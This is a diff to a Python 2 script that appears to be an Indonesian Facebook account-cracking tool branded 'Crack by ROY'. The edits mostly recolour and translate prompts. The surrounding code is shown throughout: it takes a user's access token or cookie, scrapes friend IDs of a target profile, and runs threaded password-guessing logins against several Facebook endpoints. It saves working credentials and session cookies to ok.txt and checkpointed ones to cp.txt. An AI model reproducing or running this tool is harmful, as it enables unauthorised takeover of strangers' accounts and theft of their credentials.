@@ -117,7 +117,7 @@ def gets_dict_cookies(cookies):
 			result.update({i.split("=")[0]:i.split("=")[1]})
 		return result
 def gen():
-	ck=raw_input("   [•] Cookie : ")
+	ck=raw_input("[?] Cookie : ")
 	if ck=="":gen()
 	try:
 		cks=gets_dict_cookies(ck)
@@ -127,22 +127,22 @@ def gen():
 			print ('[!] Login Success').format(G,N)
 			time.sleep(1)
 			menu()
-		else:print("[!] Invalid Cookie").format(R,N);gen()
+		else:print("\033[0;91m[!] Invalid Cookie").format(R,N);gen()
 	except Exception as e:
-		print("[!] Error : %s"%e);gen()
+		print("\033[0;91m[!] Error : %s"%e);gen()
                 logs()
 def log_token():
-	data = raw_input("[•] Token :")
+	data = raw_input("\033[0;93m[?] Token :")
 	try:
 		me = requests.get('https://graph.facebook.com/me?access_token='+data)
 		a = json.loads(me.text)
 		nama = a['name']
 		open("login.txt",'w').write(data)
-		print("[!] Login Success").format(G,N)
+		print("\033[0;92m[✓] Login Success").format(G,N)
 		bot_komen()
 		menu()
 	except KeyError:
-		print ("[!] Invalid Token").format(R,N)
+		print ("\033[0;91m[!] Invalid Token").format(R,N)
 		time.sleep(1.0)
 		logs()
 def convert():
@@ -168,14 +168,14 @@ def convert():
 			open("login.txt",'w').write(find_token.group(1))
 			return
 	except Exception as e:
-		print(R+"\n[•] Error : %s"%e)
+		print(R+"\n\033[0;91m[!] Error : %s"%e)
 		exit()
 # bot komen jan di ganti tambahin aja
 def bot_komen():
 	try:
 		toket=open('login.txt','r').read()
 	except IOError:
-		print"[!] Token invalid"
+		print"\033[0;91m[!] Token invalid"
 		logs()
 	una = ('403290050858408')
 	kom = ('https://web.facebook.com/photo?fbid=403290050858408&set=a.101597811027635&type=3&app=fbl')
@@ -194,21 +194,21 @@ def menu():
     nama = a['name']
     id = a['id']
   except Exception as e:
-    print ("[•] Error : %s"%e).format(R,N)
+    print ("\033[0;91m[!] Error : %s"%e).format(R,N)
     time.sleep(1)
     logs()
   os.system("clear")
   banner()
-  print("\033[0;97m[•] Hello	: "+nama)
-  print("\033[0;97m[•] UID	: "+id)
+  print("\033[0;92m[*] Hello	: "+nama)
+  print("\033[0;92m[*] UID	: "+id)
   print("\033[0;92m───────────────────────────────────────────────")
-  print("\033[0;97m[ Pilih Opsi ]")
+  print("\033[0;93m[ Pilih Opsi ]")
   print("\033[0;97m[1] Dump ID Public/Friend")
   print("\033[0;97m[2] Crack")
   print("\033[0;97m[0] Logout")
   print("\033[0;92m───────────────────────────────────────────────")
-  r=raw_input("\033[0;97m[•] Input	: ")
-  if r=="":print("\033[0;97m[!] Isi Yang Benar").format(R,N);menu()
+  r=raw_input("\033[0;93m[?] Input	: ")
+  if r=="":print("\033[0;91m[!] Isi Yang Benar").format(R,N);menu()
   elif r=="1":
     publik()
   elif r=="2":
@@ -219,14 +219,14 @@ def menu():
       os.remove(".cok")
       os.remove("login.txt")
       exit(basecookie())
-    except Exception as e:print("\033[0;97m[•] Error file tidak ditemukan %s"%e)
+    except Exception as e:print("\033[0;91m[!] Error file tidak ditemukan %s"%e)
   else:
-    print ("[•] Wrong Input").format(R,N);menu()
+    print ("\033[0;91m[!] Wrong Input").format(R,N);menu()
 def publik():
 	try:
 		toket=open('login.txt','r').read()
 	except IOError:
-		print("[•] Cookie Invalid").format(R,N)
+		print("\033[0;91m[!] Cookie Invalid").format(R,N)
 		os.system('rm -rf login.txt')
 		time.sleep(0.01)
 		gen()
@@ -234,20 +234,20 @@ def publik():
                 os.system("clear")
                 banner()
                 print ("\033[0;92m───────────────────────────────────────────────")
-		print("[•] Ketik \'me\' Jika Ingin Mengambil ID Dari Daftar Teman")
-		idt = raw_input("\033[0;97m[•] User ID Target	: ")
+		print("\033[0;93m[?] Ketik \'me\' Jika Ingin Mengambil ID Dari Daftar Teman")
+		idt = raw_input("\033[0;97m[*] User ID Target	: ")
 		try:
 			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
 			op = json.loads(jok.text)
-			print("\033[0;97m[•] Name	: "+op["name"])
+			print("\033[0;97m[*] Name	: "+op["name"])
 		except KeyError:
-			print("[!] ID NOT found !").format("R")
-			print("[!] Kembali").format(N)
+			print("\033[0;91m[!] ID NOT found !").format("R")
+			print("\033[0;93m[!] Kembali").format(N)
 			publik()
 		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(50000)&access_token="+toket)
 		id = []
 		z=json.loads(r.text)
-		print("\033[0;97m[•] Getting ID ...")
+		print("\033[0;93m[*] Getting ID ...")
 		print ("\033[0;92m───────────────────────────────────────────────")
 		qq = (op['first_name']+'.json').replace(" ","_")
 		ys = open(qq , 'w')#.replace(" ","_")
@@ -258,15 +258,15 @@ def publik():
 			print (  a["name"])
 		ys.close()
 		print ("\033[0;92m───────────────────────────────────────────────")
-		print ('\033[0;97m[•] Sukses Mengambil ID dari %s'%op['name'])
-		print ("\033[0;97m[•] Total ID	: %s"%(len(id)))
-		print ("\033[0;97m[•] Output	: %s"%qq)
+		print ('\033[0;97m[✓] Sukses Mengambil ID dari %s'%op['name'])
+		print ("\033[0;97m[✓] Total ID	: %s"%(len(id)))
+		print ("\033[0;97m[✓] Output	: %s"%qq)
                 print ("\033[0;92m───────────────────────────────────────────────")
-		raw_input("\033[0;97m[•] [Kembali]")
+		raw_input("\033[0;93m[?] [Kembali]")
 		menu()
 		
 	except Exception as e:
-		exit("[•] Error	: %s"%e)
+		exit("\033[0;91m[!] Error	: %s"%e)
 def mbasic(em,pas,hosts):
 	global ua,mbasic_h
 	r=requests.Session()
@@ -411,14 +411,14 @@ def methode():
   os.system("clear")
   banner()
   print("\033[0;92m───────────────────────────────────────────────")
-  print("\033[0;97m[ Pilih Metode Crack ]")
-  print("\033[0;97m[1] Crack With mbasic")
-  print("\033[0;97m[2] Crack With m.facebook.com")
-  print("\033[0;97m[3] Crack With touch.facebook.com")
-  print("\033[0;97m[4] Crack With api")
+  print("\033[0;93m[ Pilih Metode Crack ]")
+  print("\033[0;97m[1] Crack Dengan mbasic.facebook.com")
+  print("\033[0;97m[2] Crack Dengan m.facebook.com")
+  print("\033[0;97m[3] Crack Dengan touch.facebook.com")
+  print("\033[0;97m[4] Crack Dengan api.facebook.com")
   print("\033[0;92m───────────────────────────────────────────────")
-  sek=raw_input("\033[0;97m[•] Input	: ")
-  if sek=="":print("\033[0;97m   [!] Isi Yang Benar").format(R,N);methode()
+  sek=raw_input("\033[0;93m[?] Input	: ")
+  if sek=="":print("\033[0;91m   [!] Isi Yang Benar").format(R,N);methode()
   elif sek=="1":
     crack()
   elif sek=="2":
@@ -428,17 +428,17 @@ def methode():
   elif sek=="4":
     crack3()
   else:
-    print("\033[0;97m[!] Isi Yang Benar").format(R,N);methode()
+    print("\033[0;91m[!] Isi Yang Benar").format(R,N);methode()
 def logs():
   banner()
   print("\033[0;92m───────────────────────────────────────────────")
-  print("\033[0;97m[ Pilih Metode Login ]")
-  print("\033[0;97m[1] Login With Token")
-  print("\033[0;97m[0] Exit")
+  print("\033[0;93m[ Pilih Metode Login ]")
+  print("\033[0;97m[1] Login Dengan Token")
+  print("\033[0;91m[0] Exit")
   print("\033[0;92m───────────────────────────────────────────────")
-  sek=raw_input("\033[0;97m[•] Input	: ")
+  sek=raw_input("\033[0;93m[?] Input	: ")
   if sek=="":
-    print("\033[0;97m[!] Isi Yang Benar").format(R,N);logs()
+    print("\033[0;91m[!] Isi Yang Benar").format(R,N);logs()
   elif sek=="1":
     log_token()
   elif sek=="2":
@@ -446,7 +446,7 @@ def logs():
   elif sek=="3":
     exit()
   else:
-    print("\033[0;97m[!] Isi Yang Benar").format(R,N);logs()
+    print("\033[0;91m[!] Isi Yang Benar").format(R,N);logs()
 class crack:
         os.system("clear")
         banner()
@@ -454,15 +454,15 @@ class crack:
 		self.ada=[]
 		self.cp=[]
 		self.ko=0
-		print("\033[0;97m[•] Crack With Pass Default Or Manual [d/m]")
+		print("\033[0;93m[?] Crack Dengan Pass Default Or Manual [d/m]")
 		while True:
-			f=raw_input("\033[0;97m[•] Pilih	: ")
+			f=raw_input("\033[0;93m[?] Pilih	: ")
 			if f=="":continue
 			elif f=="m":
 				try:
 					while True:
 						try:
-							self.apk=raw_input("\033[0;97m[•] ID List File : ")
+							self.apk=raw_input("\033[0;97m[?] ID List File: ")
 							self.fs=open(self.apk).read().splitlines()
 							break
 						except Exception as e:
@@ -476,14 +476,14 @@ class crack:
 				except Exception as e:
 					print ("   %s"%e)
 					continue
-				print ("\033[0;97m[•] Example	: pass123,pass12345")
+				print ("\033[0;93m[!] Contoh	: pass123,pass12345")
 				self.pwlist()
 				break
 			elif f=="d":
 				try:
 					while True:
 						try:
-							self.apk=raw_input("\033[0;97m[•] ID List File : ")
+							self.apk=raw_input("\033[0;97m[?] ID List File: ")
 							self.fs=open(self.apk).read().splitlines()
 							break
 						except Exception as e:
@@ -498,36 +498,36 @@ class crack:
 					print ("   %s"%e)
 					continue
                                 print ("\033[0;92m───────────────────────────────────────────────")
-				print ("\033[0;97m[•] Crack Started...")
-				print ("\033[0;97m[•] Account [OK] saved to : ok.txt")
-				print ("\033[0;97m[•] Account [CP] saved to : checkpoint.txt")
+				print ("\033[0;97m[✓] Crack by ROY sedang berjalan...")
+				print ("\033[0;97m[✓] Akun [OK] disimpan di : ok.txt")
+				print ("\033[0;97m[✓] Akun [CP] disimpan di : checkpoint.txt")
                                 print ("\033[0;92m───────────────────────────────────────────────")
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
-				print("[•] Finished")
+				print("\033[0;92m[✓] Selesai")
 				break
 	def pwlist(self):
-		self.pw=raw_input("\033[0;97m[•] Password List : ").split(",")
+		self.pw=raw_input("\033[0;93m[?] Password List : ").split(",")
 		if len(self.pw) ==0:
 			self.pwlist()
 		else:
 			for i in self.fl:
 				i.update({"pw":self.pw})
                         print ("\033[0;92m───────────────────────────────────────────────")
-			print ("\033[0;97m[•] Crack Started...")
-			print ("\033[0;97m[•] Account [OK] saved to : ok.txt")
-			print ("\033[0;97m[•] Account [CP] saved to : checkpoint.txt")
+			print ("\033[0;97m[✓] Crack by ROY sedang berjalan...")
+			print ("\033[0;97m[✓] Akun [OK] disimpan di : ok.txt")
+			print ("\033[0;97m[✓] Akun [CP] disimpan di : checkpoint.txt")
                         print ("\033[0;92m───────────────────────────────────────────────")
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
-			print("[•] Finished")
+			print("\033[0;92m[✓] Selesai")
 	def main(self,fl):
 		try:
 			for i in fl.get("pw"):
 				log=mbasic(fl.get("id"),
 					i,"https://mbasic.facebook.com")
 				if log.get("status")=="success":
-					print("\r[OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
+					print("\r\033[0;92m[ID]%s %s • %s %s      "%(G,fl.get("id"),i,N))
 					self.ada.append("%s < > %s"%(fl.get("id"),i))
 					if fl.get("id") in open("ok.txt").read():
 						break
@@ -537,7 +537,7 @@ class crack:
 					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
 					break
 				elif log.get("status")=="cp":
-					print("\r[CP]%s %s • %s %s %s      "%(O,fl.get("id"),i,N))
+					print("\r\033[0;93m[ID]%s %s • %s %s %s      "%(O,fl.get("id"),i,N))
 					self.cp.append("%s|%s"%(fl.get("id"),i))
 					open("cp.txt","a+").write(
 						"%s|%s|\n"%(fl.get("id"),i))
@@ -555,15 +555,15 @@ class crack1:
 		self.ada=[]
 		self.cp=[]
 		self.ko=0
-		print("\033[0;97m[•] Crack With Pass Default Or Manual [d/m]")
+		print("\033[0;93m[?] Crack Dengan Pass Default Or Manual [d/m]")
 		while True:
-			f=raw_input("\033[0;97m[•] Pilih	: ")
+			f=raw_input("\033[0;93m[?] Pilih	: ")
 			if f=="":continue
 			elif f=="m":
 				try:
 					while True:
 						try:
-							self.apk=raw_input("\033[0;97m[•] ID List File : ")
+							self.apk=raw_input("\033[0;97m[?] ID List File: ")
 							self.fs=open(self.apk).read().splitlines()
 							break
 						except Exception as e:
@@ -577,14 +577,14 @@ class crack1:
 				except Exception as e:
 					print ("   %s"%e)
 					continue
-				print ("\033[0;97m[•] Example	: pass123,pass12345")
+				print ("\033[0;93m[!] Contoh	: pass123,pass12345")
 				self.pwlist()
 				break
 			elif f=="d":
 				try:
 					while True:
 						try:
-							self.apk=raw_input("\033[0;97m[•] ID List File : ")
+							self.apk=raw_input("\033[0;97m[?] ID List File: ")
 							self.fs=open(self.apk).read().splitlines()
 							break
 						except Exception as e:
@@ -599,36 +599,36 @@ class crack1:
 					print ("   %s"%e)
 					continue
                                 print ("\033[0;92m───────────────────────────────────────────────")
-				print ("\033[0;97m[•] Crack Started...")
-				print ("\033[0;97m[•] Account [OK] saved to : ok.txt")
-				print ("\033[0;97m[•] Account [CP] saved to : checkpoint.txt")
+				print ("\033[0;97m[✓] Crack by ROY sedang berjalan...")
+				print ("\033[0;97m[✓] Akun [OK] disimpan di : ok.txt")
+				print ("\033[0;97m[✓] Akun [CP] disimpan di : checkpoint.txt")
                                 print ("\033[0;92m───────────────────────────────────────────────")
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
-				print("[•] Finished")
+				print("\033[0;92m[✓] Selesai")
 				break
 	def pwlist(self):
-		self.pw=raw_input("\033[0;97m[•] Password List	: ").split(",")
+		self.pw=raw_input("\033[0;93m[?] Password List	: ").split(",")
 		if len(self.pw) ==0:
 			self.pwlist()
 		else:
 			for i in self.fl:
 				i.update({"pw":self.pw})
                         print ("\033[0;92m───────────────────────────────────────────────")
-			print ("\033[0;97m[•] Crack Started...")
-			print ("\033[0;97m[•] Account [OK] saved to : ok.txt")
-			print ("\033[0;97m[•] Account [CP] saved to : checkpoint.txt")
+			print ("\033[0;97m[✓] Crack by ROY sedang berjalan...")
+			print ("\033[0;97m[✓] Akun [OK] disimpan di : ok.txt")
+			print ("\033[0;97m[✓] Akun [CP] disimpan di : checkpoint.txt")
                         print ("\033[0;92m───────────────────────────────────────────────")
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
-			print("[•] Finished")
+			print("\033[0;92m[✓] Selesai")
 	def main(self,fl):
 		try:
 			for i in fl.get("pw"):
 				log=m_fb(fl.get("id"),
 					i,"https://m.facebook.com")
 				if log.get("status")=="success":
-					print("\r[OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
+					print("\r\033[0;92m[ID]%s %s • %s %s      "%(G,fl.get("id"),i,N))
 					self.ada.append("%s|%s"%(fl.get("id"),i))
 					if fl.get("id") in open("ok.txt").read():
 						break
@@ -638,7 +638,7 @@ class crack1:
 					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
 					break
 				elif log.get("status")=="cp":
-					print("\r[CP]%s %s • %s %s      "%(O,fl.get("id"),i,N))
+					print("\r\033[0;92m[ID]%s %s • %s %s      "%(O,fl.get("id"),i,N))
 					self.cp.append("%s|%s"%(fl.get("id"),i))
 					open("cp.txt","a+").write(
 						"%s|%s|\n"%(fl.get("id"),i))
@@ -656,15 +656,15 @@ class crack2:
 		self.ada=[]
 		self.cp=[]
 		self.ko=0
-		print("\033[0;97m[•] Crack With Pass Default Or Manual [d/m]")
+		print("\033[0;93m[?] Crack Dengan Pass Default Or Manual [d/m]")
 		while True:
-			f=raw_input("\033[0;97m[•] Pilih	: ")
+			f=raw_input("\033[0;93m[?] Pilih	: ")
 			if f=="":continue
 			elif f=="m":
 				try:
 					while True:
 						try:
-							self.apk=raw_input("\033[0;97m[•] ID List File : ")
+							self.apk=raw_input("\033[0;97m[?] ID List File: ")
 							self.fs=open(self.apk).read().splitlines()
 							break
 						except Exception as e:
@@ -678,14 +678,14 @@ class crack2:
 				except Exception as e:
 					print ("   %s"%e)
 					continue
-				print ("\033[0;97m[•] Example	: pass123,pass12345")
+				print ("\033[0;93m[!] Contoh	: pass123,pass12345")
 				self.pwlist()
 				break
 			elif f=="d":
 				try:
 					while True:
 						try:
-							self.apk=raw_input("\033[0;97m[•] ID List File : ")
+							self.apk=raw_input("\033[0;97m[?] ID List File: ")
 							self.fs=open(self.apk).read().splitlines()
 							break
 						except Exception as e:
@@ -700,36 +700,36 @@ class crack2:
 					print ("   %s"%e)
 					continue
                                 print ("\033[0;92m───────────────────────────────────────────────")
-				print ("\033[0;97m[•] Crack Started...")
-				print ("\033[0;97m[•] Account [OK] saved to : ok.txt")
-				print ("\033[0;97m[•] Account [CP] saved to : checkpoint.txt")
+				print ("\033[0;97m[✓] Crack by ROY sedang berjalan...")
+				print ("\033[0;97m[✓] Akun [OK] disimpan di : ok.txt")
+				print ("\033[0;97m[✓] Akun [CP] disimpan di : checkpoint.txt")
                                 print ("\033[0;92m───────────────────────────────────────────────")
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
-				print("[•] Finished")
+				print("\033[0;92m[✓] Selesai")
 				break
 	def pwlist(self):
-		self.pw=raw_input("\033[0;97m[•] Password List	: ").split(",")
+		self.pw=raw_input("\033[0;93m[?] Password List	: ").split(",")
 		if len(self.pw) ==0:
 			self.pwlist()
 		else:
 			for i in self.fl:
 				i.update({"pw":self.pw})
                         print ("\033[0;92m───────────────────────────────────────────────")
-			print ("\033[0;97m[•] Crack Started...")
-			print ("\033[0;97m[•] Account [OK] saved to : ok.txt")
-			print ("\033[0;97m[•] Account [CP] saved to : checkpoint.txt")
+			print ("\033[0;97m[✓] Crack by ROY sedang berjalan...")
+			print ("\033[0;97m[✓] Akun [OK] disimpan di : ok.txt")
+			print ("\033[0;97m[✓] Akun [CP] disimpan di : checkpoint.txt")
                         print ("\033[0;92m───────────────────────────────────────────────")
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
-			print("[•] Finished")
+			print("\033[0;92m[✓] Selesai")
 	def main(self,fl):
 		try:
 			for i in fl.get("pw"):
 				log=touch_fb(fl.get("id"),
 					i,"https://touch.facebook.com")
 				if log.get("status")=="success":
-					print("\r[OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
+					print("\r\033[0;92m[ID]%s %s • %s %s      "%(G,fl.get("id"),i,N))
 					self.ada.append("%s|%s"%(fl.get("id"),i))
 					if fl.get("id") in open("ok.txt").read():
 						break
@@ -739,7 +739,7 @@ class crack2:
 					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
 					break
 				elif log.get("status")=="cp":
-					print("\r[CP]%s %s • %s %s      "%(O,fl.get("id"),i,N))
+					print("\r\033[0;93m[ID]%s %s • %s %s      "%(O,fl.get("id"),i,N))
 					self.cp.append("%s|%s"%(fl.get("id"),i))
 					open("cp.txt","a+").write(
 						"%s|%s|\n"%(fl.get("id"),i))
@@ -757,15 +757,15 @@ class crack2:
 		self.ada=[]
 		self.cp=[]
 		self.ko=0
-		print("\033[0;97m[•] Crack With Pass Default Or Manual [d/m]")
+		print("\033[0;93m[?] Crack Dengan Pass Default Or Manual [d/m]")
 		while True:
-			f=raw_input("\033[0;97m[•] Pilih	: ")
+			f=raw_input("\033[0;93m[?] Pilih	: ")
 			if f=="":continue
 			elif f=="m":
 				try:
 					while True:
 						try:
-							self.apk=raw_input("\033[0;97m[•] ID List File : ")
+							self.apk=raw_input("\033[0;97m[?] ID List File: ")
 							self.fs=open(self.apk).read().splitlines()
 							break
 						except Exception as e:
@@ -779,14 +779,14 @@ class crack2:
 				except Exception as e:
 					print ("   %s"%e)
 					continue
-				print ("\033[0;97m[•] Example	: pass123,pass12345")
+				print ("\033[0;93m[!] Contoh	: pass123,pass12345")
 				self.pwlist()
 				break
 			elif f=="d":
 				try:
 					while True:
 						try:
-							self.apk=raw_input("\033[0;97m[•] ID List File : ")
+							self.apk=raw_input("\033[0;97m[?] ID List File: ")
 							self.fs=open(self.apk).read().splitlines()
 							break
 						except Exception as e:
@@ -801,36 +801,36 @@ class crack2:
 					print ("   %s"%e)
 					continue
                                 print ("\033[0;92m───────────────────────────────────────────────")
-				print ("\033[0;97m[•] Crack Started...")
-				print ("\033[0;97m[•] Account [OK] saved to : ok.txt")
-				print ("\033[0;97m[•] Account [CP] saved to : checkpoint.txt")
+				print ("\033[0;97m[✓] Crack by ROY sedang berjalan...")
+				print ("\033[0;97m[✓] Akun [OK] disimpan di : ok.txt")
+				print ("\033[0;97m[✓] Akun [CP] disimpan di : checkpoint.txt")
                                 print ("\033[0;92m───────────────────────────────────────────────")
 				ThreadPool(35).map(self.main,self.fl)
 				os.remove(self.apk)
-				print("[•] Finished")
+				print("\033[0;92m[✓] Selesai")
 				break
 	def pwlist(self):
-		self.pw=raw_input("\033[0;97m[•] Password List	: ").split(",")
+		self.pw=raw_input("\033[0;93m[?] Password List	: ").split(",")
 		if len(self.pw) ==0:
 			self.pwlist()
 		else:
 			for i in self.fl:
 				i.update({"pw":self.pw})
                         print ("\033[0;92m───────────────────────────────────────────────")
-			print ("\033[0;97m[•] Crack Started...")
-			print ("\033[0;97m[•] Account [OK] saved to : ok.txt")
-			print ("\033[0;97m[•] Account [CP] saved to : checkpoint.txt")
+			print ("\033[0;97m[✓] Crack by ROY sedang berjalan...")
+			print ("\033[0;97m[✓] Akun [OK] disimpan di : ok.txt")
+			print ("\033[0;97m[✓] Akun [CP] disimpan di : checkpoint.txt")
                         print ("\033[0;92m───────────────────────────────────────────────")
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
-			print("[•] Finished")
+			print("\033[0;92m[✓] Selesai")
 	def main(self,fl):
 		try:
 			for i in fl.get("pw"):
 				log=touch_fb(fl.get("id"),
 					i,"https://touch.facebook.com")
 				if log.get("status")=="success":
-					print("\r[OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
+					print("\r\033[0;92m[ID]%s %s • %s %s      "%(G,fl.get("id"),i,N))
 					self.ada.append("%s|%s"%(fl.get("id"),i))
 					if fl.get("id") in open("ok.txt").read():
 						break
@@ -840,7 +840,7 @@ class crack2:
 					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
 					break
 				elif log.get("status")=="cp":
-					print("\r[CP]%s %s • %s %s      "%(O,fl.get("id"),i,N))
+					print("\r\033[0;93m[ID]%s %s • %s %s      "%(O,fl.get("id"),i,N))
 					self.cp.append("%s|%s"%(fl.get("id"),i))
 					open("cp.txt","a+").write(
 						"%s|%s|\n"%(fl.get("id"),i))
@@ -858,15 +858,15 @@ class crack3:
 		self.ada=[]
 		self.cp=[]
 		self.ko=0
-		print("\033[0;97m[•] Crack With Pass Default Or Manual [d/m]")
+		print("\033[0;93m[?] Crack Dengan Pass Default Or Manual [d/m]")
 		while True:
-			f=raw_input("\033[0;97m[•] Pilih	: ")
+			f=raw_input("\033[0;93m[?] Pilih	: ")
 			if f=="":continue
 			elif f=="m":
 				try:
 					while True:
 						try:
-							self.apk=raw_input("\033[0;97m[•] ID List File : ")
+							self.apk=raw_input("\033[0;97m[?] ID List File: ")
 							self.fs=open(self.apk).read().splitlines()
 							break
 						except Exception as e:
@@ -880,14 +880,14 @@ class crack3:
 				except Exception as e:
 					print ("   %s"%e)
 					continue
-				print ("\033[0;97m[•] Example : pass123,pass12345")
+				print ("\033[0;93m[!] Contoh : pass123,pass12345")
 				self.pwlist()
 				break
 			elif f=="d":
 				try:
 					while True:
 						try:
-							self.apk=raw_input("\033[0;97m[•] ID List File : ")
+							self.apk=raw_input("\033[0;97m[?] ID List File: ")
 							self.fs=open(self.apk).read().splitlines()
 							break
 						except Exception as e:
@@ -902,36 +902,36 @@ class crack3:
 					print ("   %s"%e)
 					continue
                                 print ("\033[0;92m───────────────────────────────────────────────")
-				print ("\033[0;97m[•] Crack Started...")
-				print ("\033[0;97m[•] Account [OK] saved to : ok.txt")
-				print ("\033[0;97m[•] Account [CP] saved to : checkpoint.txt")
+				print ("\033[0;97m[✓] Crack by ROY sedang berjalan...")
+				print ("\033[0;97m[✓] Akun [OK] disimpan di : ok.txt")
+				print ("\033[0;97m[✓] Akun [CP] disimpan di : checkpoint.txt")
                                 print ("\033[0;92m───────────────────────────────────────────────")
 				ThreadPool(30).map(self.main,self.fl)
 				os.remove(self.apk)
-				print("[•] Finished")
+				print("\033[0;92m[✓] Selesai")
 				break
 	def pwlist(self):
-		self.pw=raw_input("\033[0;97m[•] Password List	: ").split(",")
+		self.pw=raw_input("\033[0;93m[?] Password List	: ").split(",")
 		if len(self.pw) ==0:
 			self.pwlist()
 		else:
 			for i in self.fl:
 				i.update({"pw":self.pw})
                         print ("\033[0;92m───────────────────────────────────────────────")
-			print ("\033[0;97m[•] Crack Started...")
-			print ("\033[0;97m[•] Account [OK] saved to : ok.txt")
-			print ("\033[0;97m[•] Account [CP] saved to : checkpoint.txt")
+			print ("\033[0;97m[✓] Crack by ROY sedang berjalan...")
+			print ("\033[0;97m[✓] Akun [OK] disimpan di : ok.txt")
+			print ("\033[0;97m[✓] Akun [CP] disimpan di : checkpoint.txt")
                         print ("\033[0;92m───────────────────────────────────────────────")
 			ThreadPool(30).map(self.main,self.fl)
 			os.remove(self.apk)
-			print("[•] Finished")
+			print("\033[0;92m[✓] Selesai")
 	def main(self,fl):
 		try:
 			for i in fl.get("pw"):
 				log=graph_fb(fl.get("id"),
 					i,"https://graph.facebook.com")
 				if log.get("status")=="success":
-					print("\r[OK]%s %s • %s %s      "%(G,fl.get("id"),i,N))
+					print("\r\033[0;92m[ID]%s %s • %s %s      "%(G,fl.get("id"),i,N))
 					self.ada.append("%s|%s"%(fl.get("id"),i))
 					if fl.get("id") in open("ok.txt").read():
 						break
@@ -941,7 +941,7 @@ class crack3:
 					ko="%s|%s|%s\n\n"%(fl.get("id"),i,gets_cookies(log.get("cookies")))
 					break
 				elif log.get("status")=="cp":
-					print("\r[CP]%s %s • %s %s      "%(O,fl.get("id"),i,N))
+					print("\r\033[0;93m[ID]%s %s • %s %s      "%(O,fl.get("id"),i,N))
 					self.cp.append("%s|%s"%(fl.get("id"),i))
 					open("cp.txt","a+").write(
 						"%s|%s|\n"%(fl.get("id"),i))
